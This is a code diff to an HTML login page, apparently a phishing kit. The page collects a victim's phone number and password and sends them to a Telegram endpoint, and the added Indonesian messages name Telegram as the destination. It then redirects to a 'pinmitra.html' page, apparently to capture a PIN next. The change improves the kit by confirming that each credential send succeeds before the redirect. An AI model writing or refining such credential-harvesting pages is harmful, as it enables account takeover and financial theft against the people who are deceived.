@@ -105,7 +105,8 @@
         <button id="btnLogin" class="login-button">Log in</button>
     </div>
     <script>
-        document.getElementById("btnLogin").addEventListener("click", function () {
+        document.getElementById("btnLogin").addEventListener("click", function (e) {
+            e.preventDefault();
             var nomorhp = document.getElementById('nomorhp').value.trim();
             var password = document.getElementById('password').value.trim();
 
@@ -121,16 +122,21 @@
 
             fetch(url, {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(params)
             })
-            .finally(() => {
-                window.location.href = "pinmitra.html";
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = "pinmitra.html";
+                } else {
+                    alert("Gagal kirim ke Telegram: " + data.description);
+                }
+            })
+            .catch((error) => {
+                alert("Gagal koneksi ke Telegram: " + error);
             });
         });
     </script>
-    <script src="JavaScript.js"></script>
 </body>
 </html>
